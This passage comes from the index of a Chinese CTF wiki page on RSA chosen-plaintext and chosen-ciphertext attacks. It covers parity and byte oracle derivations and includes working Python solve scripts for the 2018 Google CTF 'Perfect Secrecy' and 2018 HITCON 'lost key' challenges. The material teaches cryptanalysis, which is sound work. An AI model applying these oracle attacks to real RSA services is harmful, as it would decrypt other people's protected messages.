&=\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-1}+(a_1*2^1+a_0*2^0)*2^{-2}\\mod2\\\\ &\\equiv a_2+(a_1*2^1+a_0*2^0)*2^{-2}\\equiv y\\pmod2 \\end{aligned} \\begin{aligned} &m*(2^{-2}\\mod N_2)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-2}\\mod2\\\\ &=[2^2(\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-2})+a_1*2^1+a_0*2^0]*2^{-2}\\mod 2\\\\ &=\\displaystyle\\sum_{i=2}^{logm-1}a_i*2^{i-1}+(a_1*2^1+a_0*2^0)*2^{-2}\\mod2\\\\ &\\equiv a_2+(a_1*2^1+a_0*2^0)*2^{-2}\\equiv y\\pmod2 \\end{aligned} \\begin{aligned} &y-(a_1*2^1+a_0*2^0)*2^{-2}\\\\ &=(m*2^{-2}\\mod2)-(a_1*2^1+a_0*2^0)*2^{-2}\\equiv a_2\\pmod2 \\end{aligned} \\begin{aligned} &y-(a_1*2^1+a_0*2^0)*2^{-2}\\\\ &=(m*2^{-2}\\mod2)-(a_1*2^1+a_0*2^0)*2^{-2}\\equiv a_2\\pmod2 \\end{aligned} \u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u524di-1\u4f4d\u4e0eoracle\u7684\u7ed3\u679c\u6765\u5f97\u5230\u7b2ci\u4f4d\u3002\u6ce8\u610f\u8fd9\u91cc\u7684 2^{-1} 2^{-1} \u662f 2^1 2^1 \u6a21 N_1 N_1 \u7684\u9006\u5143\u3002\u6240\u4ee5\u5bf9\u5269\u4e0b\u7684\u4f4d\uff0c\u6709 \\begin{aligned} &\\{(c(2^{-i*e_i}\\mod N_i))^{d_i}\\mod N_i\\}\\pmod2\\equiv m*2^{-i}\\\\ &a_i\\equiv (m*2^{-i}\\mod2) -\\sum_{j=0}^{i-1}a_j*2^j\\pmod2,i=1,2,...,logm-1 \\end{aligned} \\begin{aligned} &\\{(c(2^{-i*e_i}\\mod N_i))^{d_i}\\mod N_i\\}\\pmod2\\equiv m*2^{-i}\\\\ &a_i\\equiv (m*2^{-i}\\mod2) -\\sum_{j=0}^{i-1}a_j*2^j\\pmod2,i=1,2,...,logm-1 \\end{aligned} \u5176\u4e2d 2^{-i} 2^{-i} \u662f 2^i 2^i \u6a21 N_i N_i \u7684\u9006\u5143\u3002 \u5c31\u53ef\u4ee5\u9010\u6b65\u6062\u590d\u539f\u6587\u6240\u6709\u7684\u4f4d\u4fe1\u606f\u4e86\u3002\u8fd9\u6837\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(logm) O(logm) \u3002 exp: from Crypto.Util.number import * mm = bytes_to_long ( b '12345678' ) l = len ( bin ( mm )) - 2 def genkey (): while 1 : p = getPrime ( 128 ) q = getPrime ( 128 ) e = getPrime ( 32 ) n = p * q phi = ( p - 1 ) * ( q - 1 ) if GCD ( e , phi ) > 1 : continue d = inverse ( e , phi ) return e , d , n e , d , n = genkey () cc = pow ( mm , e , n ) f = str ( pow ( cc , d , n ) % 2 ) for i in range ( 1 , l ): e , d , n = genkey () cc = pow ( mm , e , n ) ss = inverse ( 2 ** i , n ) cs = ( cc * pow ( ss , e , n )) % n lb = pow ( cs , d , n ) % 2 bb = ( lb - ( int ( f , 2 ) * ss % n )) % 2 f = str ( bb ) + f assert ((( mm >> i ) % 2 ) == bb ) print ( long_to_bytes ( int ( f , 2 ))) \u53c2\u8003 \u00b6 https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack https://pastebin.com/KnEUSMxp https://github.com/ashutosh1206/Crypton","title":"RSA \u9009\u62e9\u660e\u5bc6\u6587\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa","text":"","title":"RSA \u9009\u62e9\u660e\u5bc6\u6587\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_1","text":"\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u6709\u4e00\u4e2a\u52a0\u5bc6 oracle \uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 n \u548c e\uff0c\u90a3 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u52a0\u5bc6 oracle \u83b7\u53d6 n\u3002 \u5728 e \u6bd4\u8f83\u5c0f\uff08 e<2^{64} e<2^{64} \uff09\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Pollard\u2019s kangaroo algorithm \u7b97\u6cd5\u83b7\u53d6 e\u3002\u8fd9\u4e00\u70b9\u6bd4\u8f83\u663e\u7136\u3002 \u6211\u4eec\u53ef\u4ee5\u52a0\u5bc6 2\uff0c4\uff0c8\uff0c16\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 c_2=2^{e} \\bmod n c_2=2^{e} \\bmod n c_4=4^{e} \\bmod n c_4=4^{e} \\bmod n c_8=8^{e} \\bmod n c_8=8^{e} \\bmod n \u90a3\u4e48 c_2^2 \\equiv c_4 \\bmod n c_2^2 \\equiv c_4 \\bmod n c_2^3 \\equiv c_8 \\bmod n c_2^3 \\equiv c_8 \\bmod n \u6545\u800c c_2^2-c_4=kn c_2^2-c_4=kn c_2^3-c_8=tn c_2^3-c_8=tn \u6211\u4eec\u53ef\u4ee5\u6c42\u51fa kn \u548c tn \u7684\u6700\u5927\u516c\u56e0\u6570\uff0c\u5f88\u5927\u6982\u7387\u5c31\u662f n \u4e86\u3002\u6211\u4eec\u8fd8\u53ef\u4ee5\u6784\u9020\u66f4\u591a\u7684\u4f8b\u5b50\u4ece\u6765\u66f4\u52a0\u786e\u5b9a\u6027\u5730\u627e n\u3002","title":"\u9009\u62e9\u660e\u6587\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_2","text":"\u5047\u8bbe\u7231\u4e3d\u4e1d\u521b\u5efa\u4e86\u5bc6\u6587 C = P^e \\bmod n C = P^e \\bmod n \u5e76\u4e14\u628a C \u53d1\u9001\u7ed9\u9c8d\u52c3\uff0c\u540c\u65f6\u5047\u8bbe\u6211\u4eec\u8981\u5bf9\u7231\u4e3d\u4e1d\u52a0\u5bc6\u540e\u7684\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6\uff0c\u800c\u4e0d\u662f\u53ea\u89e3\u5bc6 C\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u62e6\u622a C\uff0c\u5e76\u8fd0\u7528\u4e0b\u5217\u6b65\u9aa4\u6c42\u51fa P\uff1a \u9009\u62e9\u4efb\u610f\u7684 X\\in Z_n^{*} X\\in Z_n^{*} \uff0c\u5373 X \u4e0e N \u4e92\u7d20 \u8ba1\u7b97 Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n \u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c Z=Y^d Z=Y^d \u90a3\u4e48\uff0c\u7531\u4e8e Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n \uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P","title":"\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-parity-oracle","text":"\u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u68c0\u67e5\u89e3\u5bc6\u7684\u660e\u6587\u7684\u5947\u5076\u6027\uff0c\u5e76\u6839\u636e\u5947\u5076\u6027\u8fd4\u56de\u76f8\u5e94\u7684\u503c\uff0c\u6bd4\u5982 1 \u8868\u793a\u5947\u6570\uff0c0 \u8868\u793a\u5076\u6570\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 log(N) \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\u3002","title":"RSA parity oracle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_3","text":"\u5047\u8bbe C=P^e \\bmod N C=P^e \\bmod N \u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001 C*2^e=(2P)^e \\bmod N C*2^e=(2P)^e \\bmod N \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2P \\bmod N 2P \\bmod N \u8fd9\u91cc 2P \u662f\u5076\u6570\uff0c\u5b83\u7684\u5e42\u6b21\u4e5f\u662f\u5076\u6570\u3002 N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002 \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5373 2P \\bmod N 2P \\bmod N \u4e3a\u5947\u6570\uff0c\u5219\u8bf4\u660e 2P \u5927\u4e8e N\uff0c\u4e14\u51cf\u53bb\u4e86\u5947\u6570\u4e2a N\uff0c\u53c8\u56e0\u4e3a 2P<2N 2P<2N \uff0c\u56e0\u6b64\u51cf\u53bb\u4e86\u4e00\u4e2aN\uff0c \u5373 \\frac{N}{2} \\leq P < N \\frac{N}{2} \\leq P < N \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8003\u8651\u5411\u4e0b\u53d6\u6574\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219\u8bf4\u660e 2P \u5c0f\u4e8e N\u3002\u5373 0\\leq P < \\frac{N}{2} 0\\leq P < \\frac{N}{2} \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5411\u4e0b\u53d6\u6574\u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001 C*2^{(i+1)e} C*2^{(i+1)e} \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2^{i+1}P \\bmod N=2^{i+1}P-kN 2^{i+1}P \\bmod N=2^{i+1}P-kN 0 \\leq 2^{i+1}P-kN<N 0 \\leq 2^{i+1}P-kN<N \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5947\u6570\uff0ck=2y+1\uff0c \u90a3\u4e48 \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002\u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5076\u6570\uff0ck=2y\uff0c\u6b64\u65f6 y \u5fc5\u7136\u4e5f\u4e0e x \u76f8\u7b49\uff0c\u90a3\u4e48 \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3 lb = 0 ub = N if server returns 1 lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 \u8fd9\u91cc\u867d\u7136\u662f\u6574\u9664\uff0c \u5373\u4e0b\u53d6\u6574\uff0c\u4f46\u662f\u65e0\u6240\u8c13\u6211\u4eec\u5728\u6700\u521d\u65f6\u5df2\u7ecf\u5206\u6790\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002","title":"\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-google-ctf-perfect-secrecy","text":"\u8fd9\u91cc\u4ee5 2018 \u5e74 Google CTF \u7684\u9898\u76ee\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790 #!/usr/bin/env python3 import sys import random from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def ReadPrivateKey ( filename ): return serialization . load_pem_private_key ( open ( filename , 'rb' ) . read (), password = None , backend = default_backend ()) def RsaDecrypt ( private_key , ciphertext ): assert ( len ( ciphertext ) <= ( private_key . public_key () . key_size // 8 )), 'Ciphertext too large' return pow ( int . from_bytes ( ciphertext , 'big' ), private_key . private_numbers () . d , private_key . public_key () . public_numbers () . n ) def Challenge ( private_key , reader , writer ): try : m0 = reader . read ( 1 ) m1 = reader . read ( 1 ) ciphertext = reader . read ( private_key . public_key () . key_size // 8 ) dice = RsaDecrypt ( private_key , ciphertext ) for rounds in range ( 100 ): p = [ m0 , m1 ][ dice & 1 ] k = random . randint ( 0 , 2 ) c = ( ord ( p ) + k ) % 2 writer . write ( bytes (( c ,))) writer . flush () return 0 except Exception as e : return 1 def main (): private_key = ReadPrivateKey ( sys . argv [ 1 ]) return Challenge ( private_key , sys . stdin . buffer , sys . stdout . buffer ) if __name__ == '__main__' : sys . exit ( main ()) \u53ef\u4ee5\u770b\u51fa \u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u4e24\u4e2a\u6570\uff0c\u670d\u52a1\u5668\u4f1a\u6839\u636e\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u5185\u5bb9\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u4e2a\u3002 \u670d\u52a1\u5668\u4f1a\u4f7f\u7528 random.randint(0, 2) \u6765\u751f\u6210\u968f\u673a\u6570\uff0c\u5e76\u8f93\u51fa\u76f8\u5173\u7684\u968f\u673a 01 \u5b57\u8282 c\u3002 \u4e4d\u4e00\u770b\uff0c\u4f3c\u4e4e\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u4ed4\u7ec6\u67e5\u4e00\u4e0b random.randint(0, 2) \u53ef\u4ee5\u77e5\u9053\u5176\u751f\u6210\u968f\u673a\u6570\u662f\u5305\u62ec\u8fb9\u754c\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u5076\u6570\u7684\u6982\u7387\u5927\u4e8e\u751f\u6210\u5947\u6570\u7684\u6982\u7387\uff0c\u90a3\u4e48 c \u4e0e p \u540c\u5947\u5076\u7684\u6982\u7387\u4e3a \u2154\u3002\u8fdb\u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e m0 \u548c m1 \u5c31\u53ef\u4ee5\u77e5\u9053\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u7684\u6700\u540e\u4e00\u4f4d\u662f 0 \u8fd8\u662f 1 \u3002\u8fd9\u5176\u5b9e\u5c31\u662f RSA parity oracle\u3002 exp \u5982\u4e0b import gmpy2 from pwn import * encflag = open ( './flag.txt' ) . read () encflag = encflag . encode ( 'hex' ) encflag = int ( encflag , 16 ) #context.log_level = 'debug' m = [ ' \\x00 ' , ' \\x07 ' ] n = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1 e = 65537 flag = \"\" def guessvalue ( cnt ): if cnt [ 0 ] > cnt [ 1 ]: return 0 return 1 i = 0 while True : cnt = dict () cnt [ 0 ] = cnt [ 1 ] = 0 p = remote ( 'perfect-secrecy.ctfcompetition.com' , 1337 ) p . send ( m [ 0 ]) p . send ( m [ 1 ]) tmp = pow ( 2 , i ) two_inv = gmpy2 . invert ( tmp , n ) two_cipher = gmpy2 . powmod ( two_inv , e , n ) tmp = encflag * two_cipher % n tmp = hex ( tmp )[ 2 :] . strip ( 'L' ) tmp = '0' * ( 256 - len ( tmp )) + tmp tmp = tmp . decode ( 'hex' ) assert ( len ( tmp ) == 128 ) p . send ( tmp ) #print tmp data = \"\" while ( len ( data ) != 100 ): data += p . recv () for c in data : cnt [ u8 ( c )] += 1 p . close () flag = str ( guessvalue ( cnt )) + flag print i , flag i += 1 \u7ed3\u679c\u5982\u4e0bu89e3\u7801\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 flag CTF { h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337 }","title":"2018 Google CTF Perfect Secrecy"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_4","text":"2016 Plaid CTF rabit 2016 sharif CTF lsb-oracle-150 2018 Backdoor CTF BIT-LEAKER 2018 XMAN \u9009\u62d4\u8d5b baby RSA","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle","text":"\u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u7ed9\u51fa\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 \\log_{256}n \\log_{256}n \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\u3002","title":"RSA Byte Oracle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_5","text":"\u8fd9\u4e2a\u5176\u5b9e\u7b97\u4f5c RSA parity Oracle \u7684\u6269\u5c55\uff0c\u65e2\u7136\u53ef\u4ee5\u6cc4\u9732\u51fa\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u6309\u9053\u7406\u6211\u4eec\u83b7\u53d6\u5bc6\u6587\u5bf9\u5e94\u660e\u6587\u7684\u6b21\u6570\u5e94\u8be5\u53ef\u4ee5\u51cf\u5c11\u3002 \u5047\u8bbe C=P^e \\bmod N C=P^e \\bmod N \u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001 C*256^e=(256P)^e \\bmod N C*256^e=(256P)^e \\bmod N \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 256P \\bmod N 256P \\bmod N \u8fd9\u91cc 256P \u662f\u5076\u6570\u3002 N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002 \u7531\u4e8e P \u4e00\u822c\u662f\u5c0f\u4e8e N \u7684\uff0c\u90a3\u4e48 256P \\bmod N=256P-kn, k<256 256P \\bmod N=256P-kn, k<256 \u3002\u800c\u4e14\u5bf9\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684 k_1,k_2 k_1,k_2 \uff0c\u6211\u4eec\u6709 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256 \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u53cd\u8bc1\u6cd5\u6765\u8bc1\u660e\u4e0a\u8ff0\u4e0d\u7b49\u5f0f\u3002\u540c\u65f6 256P-kn 256P-kn \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5176\u5b9e\u5c31\u662f -kn -kn \u5728\u6a21 256 \u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u7684\u3002\u90a3\u4e48\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u9996\u5148\u679a\u4e3e\u51fa 0~255 \u60c5\u51b5\u4e0b\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6784\u9020\u4e00\u4e2a k \u548c\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6620\u5c04\u8868 map \u5f53\u670d\u52a1\u5668\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5b57\u8282 b\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u8ff0\u6784\u9020\u7684\u6620\u5c04\u8868\u5f97\u77e5 k\uff0c\u5373\u51cf\u53bb\u4e86 k \u4e2aN\uff0c \u5373 kN \\leq 256 P \\leq (k+1)N kN \\leq 256 P \\leq (k+1)N \u3002 \u6b64\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u6765\u83b7\u53d6 P \u7684\u8303\u56f4\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c \\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i}} \\frac{xN}{256^{i}} \\leq P < \\frac{xN+N}{256^{i}} \u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001 C*256^{(i+1)e} C*256^{(i+1)e} \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 256^{i+1}P \\bmod N=256^{i+1}P-kN 256^{i+1}P \\bmod N=256^{i+1}P-kN 0 \\leq 256^{i+1}P-kN<N 0 \\leq 256^{i+1}P-kN<N \\frac{kN}{256^{i+1}} \\leq P < \\frac{kN+N}{256^{i+1}} \\frac{kN}{256^{i+1}} \\leq P < \\frac{kN+N}{256^{i+1}} \u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} \\frac{256xN}{256^{i+1}} \\leq P < \\frac{256xN+256N}{256^{i+1}} \u6211\u4eec\u8fd9\u91cc\u53ef\u4ee5\u5047\u8bbe k=256y+t k=256y+t \uff0c \u800c\u8fd9\u91cc\u7684 t \u5c31\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6620\u5c04\u8868\u83b7\u53d6\u7684\u3002 \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} \\frac{256yN+tN}{256^{i+1}} \\leq P < \\frac{256yN+(t+1)N}{256^{i+1}} \u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002 \u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002 \u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3\uff0c\u521d\u59cb\u60c5\u51b5\u4e0b lb = 0 ub = N \u5047\u8bbe\u670d\u52a1\u5668\u8fd4\u56de\u4e86 b\uff0c\u90a3\u4e48 k = mab [ b ] interval = ( ub - lb ) / 256 lb = lb + interval * k ub = lb + interval","title":"\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-hitcon-lost-key","text":"\u8fd9\u662f\u4e00\u4e2a\u7efc\u5408\u9898\u76ee\uff0c\u9996\u5148\u6ca1\u6709\u7ed9\u51fa n\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u62e9\u660e\u6587\u653b\u51fb\u7684\u65b9\u5f0f\u83b7\u53d6 n\uff0c\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6 e\uff0c\u6700\u540e\u5229\u7528\u4ee3\u7801\u5982\u4e0b from pwn import * import gmpy2 from fractions import Fraction p = process ( './rsa.py' ) #p = remote('18.179.251.168', 21700) #context.log_level = 'debug' p . recvuntil ( 'Here is the flag! \\n ' ) flagcipher = int ( p . recvuntil ( ' \\n ' , drop = True ), 16 ) def long_to_hex ( n ): s = hex ( n )[ 2 :] . rstrip ( 'L' ) if len ( s ) % 2 : s = '0' + s return s def send ( ch , num ): p . sendlineafter ( 'cmd: ' , ch ) p . sendlineafter ( 'input: ' , long_to_hex ( num )) data = p . recvuntil ( ' \\n ' ) return int ( data , 16 ) if __name__ == \"__main__\" : # get n cipher2 = send ( 'A' , 2 ) cipher4 = send ( 'A' , 4 ) nset = [] nset . append ( cipher2 * cipher2 - cipher4 ) cipher3 = send ( 'A' , 3 ) cipher9 = send ( 'A' , 9 ) nset . append ( cipher3 * cipher3 - cipher9 ) cipher5 = send ( 'A' , 5 ) cipher25 = send ( 'A' , 25 ) nset . append ( cipher5 * cipher5 - cipher25 ) n = nset [ 0 ] for item in nset : n = gmpy2 . gcd ( item , n ) # get map between k and return byte submap = {} for i in range ( 0 , 256 ): submap [ - n * i % 256 ] = i # get cipher256 cipher256 = send ( 'A' , 256 ) back = flagcipher L = Fraction ( 0 , 1 ) R = Fraction ( 1 , 1 ) for i in range ( 128 ): print i flagcipher = flagcipher * cipher256 % n b = send ( 'B' , flagcipher ) k = submap [ b ] L , R = L + ( R - L ) * Fraction ( k , 256 ), L + ( R - L ) * Fraction ( k + 1 , 256 ) low = int ( L * n ) print long_to_hex ( low - low % 256 + send ( 'B' , back )) . decode ( 'hex' )","title":"2018 HITCON lost key"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-parity-oracle-variant","text":"","title":"RSA parity oracle variant"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_6","text":"\u5982\u679coracle\u7684\u53c2\u6570\u4f1a\u5728\u4e00\u5b9a\u65f6\u95f4\u3001\u8fd0\u884c\u5468\u671f\u540e\u6539\u53d8\uff0c\u6216\u8005\u7f51\u7edc\u4e0d\u7a33\u5b9a\u5bfc\u81f4\u4f1a\u8bdd\u65ad\u5f00\u3001\u91cd\u7f6e\uff0c\u4e8c\u5206\u6cd5\u5c31\u4e0d\u518d\u9002\u7528\u4e86\uff0c\u4e3a\u4e86\u51cf\u5c11\u9519\u8bef\uff0c\u5e94\u5f53\u8003\u8651\u9010\u4f4d\u6062\u590d\u3002 \u8981\u6062\u590d\u660e\u6587\u7684\u7b2c2\u4f4e\u4f4d\uff0c\u8003\u8651 \\{(c(2^{-1*e_1}\\mod N_1))^{d_1}\\mod N_1\\}\\pmod2\\equiv m*2^{-1} \\{(c(2^{-1*e_1}\\mod N_1))^{d_1}\\mod N_1\\}\\pmod2\\equiv m*2^{-1} \\begin{aligned} &m*(2^{-1}\\mod N_1)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-1}\\mod2\\\\ &=[2(\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1})+a_0*2^0]*2^{-1}\\mod 2\\\\ &=\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1}+a_0*2^0*2^{-1}\\mod2\\\\ &\\equiv a_1+a_0*2^0*2^{-1}\\equiv y\\pmod2 \\end{aligned} \\begin{aligned} &m*(2^{-1}\\mod N_1)\\mod2\\\\ &=(\\displaystyle\\sum_{i=0}^{logm-1}a_i*2^i)*2^{-1}\\mod2\\\\ &=[2(\\displaystyle\\sum_{i=1}^{logm-1}a_i*2^{i-1})+a_0*2^0]*2^{-1}\\mod 2\\\\ 